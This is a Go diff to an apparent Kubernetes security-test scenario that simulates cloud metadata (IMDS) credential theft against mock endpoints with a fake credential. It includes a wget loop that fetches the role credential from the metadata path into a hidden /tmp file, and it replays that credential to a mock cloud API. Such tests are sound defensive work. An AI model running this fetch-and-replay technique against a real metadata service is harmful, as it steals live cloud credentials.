@@ -2,7 +2,9 @@ package scenarios
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
+	"k8s.io/apimachinery/pkg/types"
 	"strings"
 	"time"
 
@@ -13,17 +15,20 @@ import (
 func init() { core.RegisterScenario(&c3IMDSTheft{}) }
 
 // c3IMDSTheft: a MOCK 169.254.169.254 metadata endpoint (in-ns ClusterIP) issues
-// a FAKE cloud credential; the compromised pod retrieves it AND uses it
-// successfully against the mock cloud API. ORACLE: the mock cloud API returns an
-// authorized response to the stolen fake cred. R6 CANNOT respond: IMDS theft is
+// a FAKE cloud credential; the compromised pod retrieves it AND presents it
+// against the mock cloud API. ORACLE: the already-captured fake value is
+// presented and the fixed mock responder returns an authorized body. The
+// responder does not validate its Authorization header. R6 CANNOT respond: IMDS theft is
 // invisible to Phoenix; a stolen cloud cred stays valid after the pod rotates.
 //
 // CONTAINMENT: the harness points the attacker at the IN-NAMESPACE mock IMDS, not
 // the real link-local address, and the credential is FAKE.
 type c3IMDSTheft struct {
-	app   string
-	imds  *mocks.MockIMDS
-	cloud *mocks.MockCloudAPI
+	app          string
+	targetUID    types.UID
+	capturedCred string
+	imds         *mocks.MockIMDS
+	cloud        *mocks.MockCloudAPI
 }
 
 func (s *c3IMDSTheft) Metadata() core.ScenarioMeta {
@@ -58,6 +63,7 @@ func (s *c3IMDSTheft) Execute(ctx context.Context, env *core.Env) (core.AttackRe
 	if err != nil {
 		return core.AttackResult{}, err
 	}
+	s.targetUID = pod.UID
 	stages := []string{
 		"cred-access: hit mock IMDS (169.254.169.254 stand-in) for cloud creds (T1552.005)",
 		"steal: retrieve the fake cloud credential (T1528)",
@@ -69,8 +75,15 @@ func (s *c3IMDSTheft) Execute(ctx context.Context, env *core.Env) (core.AttackRe
 	// beat; retrying removes the residual "len=0" race so the steal is reliable.
 	fetchCmd := fmt.Sprintf("for i in 1 2 3 4 5; do wget -T 3 -qO- http://%s:8081/latest/meta-data/iam/security-credentials/role 2>/dev/null > /tmp/.r6th_imds_cred; if [ -s /tmp/.r6th_imds_cred ]; then break; fi; sleep 1; done; cat /tmp/.r6th_imds_cred", s.imds.ClusterDNS)
 	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", fetchCmd})
+	if err := stimulusExec(ctx, res); err != nil {
+		return core.AttackResult{}, err
+	}
 	env.Log.Logf("c3-imds-theft: fetched cred body len=%d", len(res.Stdout))
-	gotCred := strings.Contains(res.Stdout, mocks.FakeIMDSCredential)
+	gotCred := json.Valid([]byte(strings.TrimSpace(res.Stdout))) && strings.Contains(res.Stdout, mocks.FakeIMDSCredential)
+	if !gotCred {
+		return core.AttackResult{}, fmt.Errorf("mock credential fetch missing or malformed")
+	}
+	s.capturedCred = strings.TrimSpace(res.Stdout)
 	return core.AttackResult{
 		Stages:   stages,
 		Commands: []string{"wget mock-imds .../security-credentials/role  # FAKE cred", "present stolen cred to mock cloud API"},
@@ -79,23 +92,37 @@ func (s *c3IMDSTheft) Execute(ctx context.Context, env *core.Env) (core.AttackRe
 }
 
 func (s *c3IMDSTheft) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
-	time.Sleep(2 * time.Second)
+	observationPause(2 * time.Second)
 	ev := map[string]string{}
-	pod, err := runningPodByApp(ctx, env, s.app)
+	pod, err := observationTarget(ctx, env, s.app, s.targetUID)
 	if err != nil {
-		// Even if the pod rotated, the stolen cloud credential remains valid — but
-		// the observable use must come from somewhere; we use the replacement pod.
-		ev["credUsed"] = "false"
-		return core.OracleResult{Achieved: false, ObservedState: "compromised pod absent for cred replay", Evidence: ev}, nil
+		// Source Pod loss cannot establish fake-value revocation or denial.
+		return core.OracleResult{}, fmt.Errorf("observation target unavailable: %w", err)
 	}
-	// Use the stolen fake credential against the mock cloud API (the oracle: an
-	// authorized response). The mock authorizes only the fake IMDS credential.
-	useCmd := fmt.Sprintf("CRED=$(cat /tmp/.r6th_imds_cred 2>/dev/null); for i in 1 2 3 4 5; do R=$(wget -T 3 -qO- --header=\"Authorization: $CRED\" http://%s:8082/authorize 2>/dev/null); if [ -n \"$R\" ]; then break; fi; sleep 1; done; printf '%%s' \"$R\"", s.cloud.ClusterDNS)
-	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", useCmd})
-	authorized := strings.Contains(res.Stdout, "\"authorized\":true")
+	if s.capturedCred == "" {
+		return core.OracleResult{}, fmt.Errorf("captured mock credential unavailable")
+	}
+	// One local mock-only exec reads the saved fake value once and uses that same
+	// shell variable for both the request and its digest evidence.
+	res := env.Exec(ctx, pod.Name, firstContainer(pod), mockReplayCommand("/tmp/.r6th_imds_cred", s.cloud.ClusterDNS))
+	out, err := observationExec(ctx, res)
+	if err != nil {
+		return core.OracleResult{}, err
+	}
+	response, err := capturedMockReplay(out, s.capturedCred)
+	if err != nil {
+		return core.OracleResult{}, err
+	}
+	authorized, err := mockResponderAuthorization(response)
+	if err != nil {
+		return core.OracleResult{}, err
+	}
 	ev["credUsed"] = fmt.Sprintf("%v", authorized)
-	ev["cloudResponse"] = strings.TrimSpace(res.Stdout)
-	state := fmt.Sprintf("stolen FAKE cloud cred authorized by mock cloud API=%v", authorized)
+	ev["cloudResponse"] = strings.TrimSpace(response)
+	ev["mockResponderChecksHeader"] = "false"
+	ev["originalPodUID"] = string(s.targetUID)
+	ev["observedPodUID"] = string(pod.UID)
+	state := fmt.Sprintf("captured FAKE fixture presented to in-namespace mock; fixed responder reported authorized=%v (header not authenticated)", authorized)
 	return core.OracleResult{Achieved: authorized, ObservedState: state, Evidence: ev}, nil
 }
 
